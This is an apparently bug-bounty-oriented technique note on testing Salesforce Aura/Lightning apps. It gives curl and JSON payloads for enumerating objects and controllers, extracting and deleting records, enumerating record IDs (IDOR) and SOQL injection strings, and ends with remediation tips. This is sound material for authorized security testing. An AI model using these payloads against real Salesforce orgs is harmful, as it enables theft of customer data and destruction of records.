---
title: "Salesforce Hacking"
type: technique
tags: [salesforce, saas, cloud, aura, soql-injection, idor, bug-bounty]
date_created: 2026-08-17
date_updated: 2026-08-17
sources: []
related: ["[[sqli]]", "[[api-security]]"]
status: active
---

# Salesforce Hacking

## Overview

Salesforce is one of the most widely used SaaS platforms in corporate environments. Misconfigurations in the Aura (Lightning) framework, sharing rules, and Apex controllers expose sensitive data and allow extraction of other users' records, IDOR, and SOQL Injection.

## Impact

- Unauthorized access to CRM data (customers, contracts, opportunities, PII)
- SOQL Injection, arbitrary data exfiltration
- Record deletion via exposed custom controllers
- Privilege escalation via custom role/permission misconfig
- CVSS: 6.5 to 9.1 depending on the exposed data

## Where to look

- Corporate apps under `*.force.com`, `*.salesforce.com`, `*.lightning.force.com`
- Community portals: `<company>.my.site.com`
- Any app that responds to the Aura paths

## Phase 1: Identification

### Detect Salesforce/Aura in traffic

```bash
# In the proxy HTTP history, search for:
/s/sfsites/aura
/aura
/sfsites/aura
```

### Confirm via POST

```bash
curl -X POST "https://target.com/s/sfsites/aura" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "message=test&aura.context=test"
```

Responses that confirm Salesforce:
- `"actions":[`
- `aura:clientOutOfSync`
- `aura:invalidSession`

## Phase 2: Reconnaissance

### Identify standard objects

```
Download the list of standard objects:
https://developer.salesforce.com/docs/atlas.en-us.api.meta/api/sforce_api_objects_list.htm
Save to objects.txt for fuzzing
```

### Identify custom objects

```bash
# Look in requests for objects ending in __c
# Use getObjectInfo and getHostConfig to enumerate
```

`getConfigData` payload:
```json
{"actions":[{"id":"1;a","descriptor":"aura://HostConfigController/ACTION$getConfigData","params":{}}]}
```

### Identify controllers

```bash
# Inspect app.js and aura_prod.js
# Look for the pattern:
grep "componentService.initControllerDefs" app.js

# Standard controllers:
# aura://RecordUiController/ACTION$getObjectInfo
# Custom controllers (apex://):
# apex://New_Sales_Controller/ACTION$getSalesData
```

## Phase 3: Fuzzing with the proxy Intruder

### Base payload for object fuzzing

Send a POST to `/aura` with body:
```json
{"actions":[{"id":"1;a","descriptor":"aura://RecordUiController/ACTION$getObjectInfo","params":{"objectApiName":"§OBJECT§"}}]}
```

Replace `§OBJECT§` with a wordlist of objects (standard + custom).

### Other actions to fuzz

```json
// getListsByObjectName
{"actions":[{"id":"1;a","descriptor":"aura://ListUiController/ACTION$getListsByObjectName","params":{"objectApiName":"§OBJECT§"}}]}
```

## Phase 4: Data extraction

### List records (getItems)

```json
{
  "actions":[{
    "id":"123;a",
    "descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems",
    "params":{
      "entityNameOrId":"§OBJECT§",
      "layoutType":"FULL",
      "pageSize":100,
      "currentPage":0
    }
  }]
}
```

### Get a specific record (getRecord)

```json
{
  "actions":[{
    "id":"123;a",
    "descriptor":"serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecord",
    "params":{
      "recordId":"§ID§"
    }
  }]
}
```

Salesforce IDs are 15 or 18 alphanumeric characters. Enumerate IDs near the observed one.

### Custom controllers

```json
// Get data
{"actions":[{"id":"1;a","descriptor":"apex://New_Sales_Controller/ACTION$getSalesData","params":{}}]}

// Delete data (PoC only with explicit authorization)
{"actions":[{"id":"1;a","descriptor":"apex://New_Sales_Controller/ACTION$deleteSalesDataById","params":{"id":"§ID§"}}]}
```

## Phase 5: SOQL Injection

### Identify injection points

Search/filter parameters passed into SOQL queries.

### Injection payload

Malicious input:
```
test%') OR (Name LIKE '
```

Resulting query (vulnerable):
```sql
SELECT Id FROM Contact WHERE (IsDeleted = false AND Name LIKE '%test%') OR (Name LIKE '%')
```

This returns **all** records of the object.

### Additional SOQL Injection payloads

```
' OR '1'='1
%' OR Name LIKE '%
test') OR (1=1 AND Name LIKE '
```

## Test checklist

- [ ] Identify the Aura endpoint in the HTTP history
- [ ] Confirm Salesforce via POST to `/aura`
- [ ] Get the list of standard and custom objects
- [ ] Inspect `app.js` for custom controllers (`apex://`)
- [ ] Fuzz objects with `getObjectInfo`
- [ ] Test `getItems` and `getRecord` with sensitive objects (User, Account, Contact, Lead)
- [ ] Enumerate record IDs near your own
- [ ] Test custom controllers for sensitive actions
- [ ] Identify search parameters and test SOQL injection
- [ ] Check whether a guest/unauthenticated user can access data

## Tools

| Tool | Use |
|---|---|
| HTTP proxy | Intercept, replay, and fuzz Aura requests |
| Salesforce Inspector (ext) | Inspect objects and data directly |
| Aura Recon | Automated recon of the Aura framework |

## Report tips

- Capture other users' records as PoC (redact real data)
- Demonstrate access to sensitive objects: User, Account, Contact, Opportunity
- For SOQL Injection: show the original vs injected query and the returned data
- Recommend: review org-wide sharing settings, validate input in Apex controllers, restrict guest access

## References

- https://developer.salesforce.com/docs/atlas.en-us.api.meta/api/sforce_api_objects_list.htm
